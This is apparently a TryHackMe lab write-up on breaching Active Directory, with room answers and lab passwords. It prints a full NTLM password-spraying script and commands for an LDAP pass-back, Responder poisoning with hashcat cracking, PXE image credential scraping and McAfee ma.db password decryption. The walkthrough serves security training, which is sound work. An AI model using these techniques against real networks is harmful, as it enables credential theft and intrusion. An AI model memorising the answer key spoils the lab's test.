# Breaching Active Directory - Medium

1. [OSINT and Phishing](#osint-and-phishing)
2. [NTLM Authenticated Services](#ntlm-authenticated-services)
3. [LDAP Bind Credentials](#ldap-bind-credentials)
4. [Authentication Relays](#authentication-relays)
5. [Microsoft Deployment Toolkit](#microsoft-deployment-toolkit)
6. [Configuration Files](#configuration-files)

## OSINT and Phishing

* OSINT - used to discover info that has been publicly disclosed; we can check for the same on websites such as [DeHashed](https://www.dehashed.com/) and [HaveIBeenPwned](https://haveibeenpwned.com/).

* Phishing - baits users to either provide creds on malicious webpages or ask them to run malicious apps containing RATs (remote access trojans).

```markdown
1. What popular website can be used to verify if your email address or password has ever been exposed in a publicly disclosed data breach? - HaveIBeenPwned
```

## NTLM Authenticated Services

* NTLM (New Technology LAN Manager) - suite of security protocols used to authenticate user identities in AD; it uses a challenge-response-based scheme called NetNTLM (Windows authentication).

* Under NTLM, all authentication material is forwarded to a DC (Domain Controller) in the form of a challenge, and if completed successfully, the user gets authenticated; the app is authenticating on behalf of the user.

* This prevents the app from storing AD creds, which should only be stored on a DC.

* For login attacks, a password spraying attack can be performed, which consists of using one password and trying to authenticate with all the usernames acquired; the other way around can trigger the account lockout mechanism.

* We have been given a custom password-spraying script to be executed against a hosted web app:

```python
#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)



if __name__ == "__main__":
    main(sys.argv[1:])
```

```shell
#password spraying attack
python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
#-f is for fqdn
```

```markdown
1. What is the name of the challenge-response authentication mechanism that uses NTLM? - NetNTLM

2. What is the username of the third valid credential pair found by the password spraying script? - gordon.stevens

3. How many valid credential pairs were found by the password spraying script? - 4

4. What is the message displayed by the web application when authenticating with a valid credential pair? - Hello World
```

## LDAP Bind Credentials

* LDAP (Lightweight Directory Access Protocol) authentication is similar to NTLM authentication; but with LDAP, the app directly verifies the user's creds.

* LDAP authentication is usually employed with 3rd party apps that integrate with AD.

* LDAP pass-back attacks can be performed when we have gained initial access to internal network and/or a device's config where LDAP params are specified.

* In this attack, we can alter the LDAP config such that while attempting LDAP authentication, we can intercept the authentication attempt to recover LDAP creds.

* For this task, we are given a username ```svcLDAP``` and a website containing the settings for a printer; this website does not require creds, but we can leverage this to get LDAP creds.

* Now, for the server IP, we can enter our IP, and use 'Test Settings' after setting up listener to attempt getting reverse shell; however it does not work with netcat, so we will have to create a rogue LDAP server.

```shell
nc -lvp 389
#since 389 is default port of LDAP
#this does not work
```

* Hosting a rogue LDAP server:

```shell
sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
#installing openLDAP

sudo dpkg-reconfigure -p low slapd
#configure LDAP server according to given instructions

#also create the given ldif file to make our rogue LDAP server vulnerable
vim olcSaslSecProps.ldif

#use ldif file to patch LDAP server
sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart

ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
#to verify if the config has been applied

#now we can click on Test Settings in the printer settings page
#and start tcpdump to capture creds
sudo tcpdump -SX -i breachad tcp port 389
#we can intercept passwords in cleartext now
```

```markdown
1. What type of attack can be performed against LDAP Authentication systems not commonly found against Windows Authentication systems? - LDAP pass-back attacks

2. What two authentication mechanisms do we allow on our rogue LDAP server to downgrade the authentication and make it clear text? - PLAIN, LOGIN

3. What is the password associated with the svcLDAP account? - tryhackmeldappass1@
```

## Authentication Relays

* SMB (Server Message Block) protocol allows clients (workstations) to communicate with a server; in AD networks, SMB is critical.

* Possible exploits for NetNTLM authentication with SMB:

  * Since NTLM challenges can be intercepted, we can use offline cracking techniques to recover password from challenge; slower than cracking NTLM hashes.

  * We can use a rogue device to stage a MITM attack, relaying SMB authentication between client & server, which can provide us with an active authenticated session to target server.

* Responder allows us to perform MITM attacks by poisoning responses during NetNTLM authentication; on a real LAN, Responder will attempt to poison any LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Servier) and WPAD (Web Proxy Auto-Discovery) requests that are detected.

```shell
sudo responder -I breachad
#after a while, we will receive a SMBv2 connection
#this can be used to extract NTLMv2-SSP response
#it includes a username and a hash

#the hash can be cracked with given wordlist
hashcat -m 5600 hashfile.txt passwordlist.txt --force
```

```markdown
1. What is the name of the tool we can use to poison and capture authentication requests on the network? - Responder

2. What is the username associated with the challenge that was captured? - svcFileCopy

3. What is the value of the cracked password associated with the challenge that was captured? - FPassword1!
```

## Microsoft Deployment Toolkit

* MDT (Microsoft Deployment Toolkit) - service that assists with automating deployment of Microsoft Operating Systems.

* MDT is usually integrated with Microsoft's SCCM (System Center Configuration Manager), used to manage updates for Microsoft apps, services, and OS.

* PXE (Preboot Execution Environment) boot is used by organizations to allow new devices that are connected to network to load & install OS directly over a network connection.

* According to the given task, we can exploit PXE boot image by performing password scraping attacks to recover AD creds used during install.

* For this task, we are given the IP of MDT server (THMMDT), and names of the BCD files from given website.

```shell
#given bcd file is x64{8342B234-6535-47C5-9CCC-0E3890173949}.bcd

#we can SSH into THMJMP1 with password 'Password1@'
ssh thm@THMJMP1.za.tryhackme.com

#follow given instructions
#copy powerpxe repo to new folder
cd Documents

mkdir sv

copy C:\powerexe sv\

cd sv

#we need to use tftp and download bcd file
#to read config of MDT server
tftp -i 10.200.26.202 GET "\Tmp\x64{8342B234-6535-47C5-9CCC-0E3890173949}.bcd" conf.bcd

#now we can use powerpxe to read the bcd file contents
powershell -executionpolicy bypass

Import-Module .\PowerPXE.ps1

$BCDFile = "conf.bcd"

Get-WimFile -bcdFile $BCDFile
#this gives us PXE boot image location

#we can use tftp again to download wim image
tftp -i 10.200.26.202 GET "\Boot\x64\Images\LiteTouchPE_x64.wim" pxeboot.wim
#this transfer will take time due to the image file size

#after recovering PXE boot image, we can exfiltrate stored creds
Get-FindCredentials -WimFile pxeboot.wim
#gives account and password deets
```

```markdown
1. What Microsoft tool is used to create and host PXE Boot images in organisations? - Microsoft Deployment Toolkit

2. What network protocol is used for recovery of files from the MDT server? - tftp

3. What is the username associated with the account that was stored in the PXE Boot image? - svcMDT

4. What is the password associated with the account that was stored in the PXE Boot image? - PXEBootSecure1@
```

## Configuration Files

* Configuration files often include AD creds; enumeration scripts and tools are used to automate the process of finding creds.

* In this task, we will recover creds from McAfee Enterprise Endpoint Security, which embeds creds used during installation to connect back to orchestrator in a file ```ma.db```.

* We can use SSH access on THMJMP1:

```shell
cd C:\ProgramData\McAfee\Agent\DB

dir
#ma.db

#we can copy ma.db to our machine via scp
#on attacker machine
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .

#we can use sqlitebrowser to read db file
sqlitebrowser ma.db

#note down the values given in task accordingly

#now using given python script
#we can try to decrypt the AUTH_PASSWD value
unzip mcafeesitelistpwddecryption.zip

cd mcafee-sitelist-pwd-decryption-master

python2 mcafee_sitelist_pwd_decrypt.py jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
#this provides us the decrypted password
```

```markdown
1. What type of files often contain stored credentials on hosts? - Configuration files

2. What is the name of the McAfee database that stores configuration including credentials used to connect to the orchestrator? - ma.db

3. What table in this database stores the credentials of the orchestrator? - AGENT_REPOSITORIES

4. What is the username of the AD account associated with the McAfee service? - svcAV

5. What is the password of the AD account associated with the McAfee service? - MyStrongPassword!
```
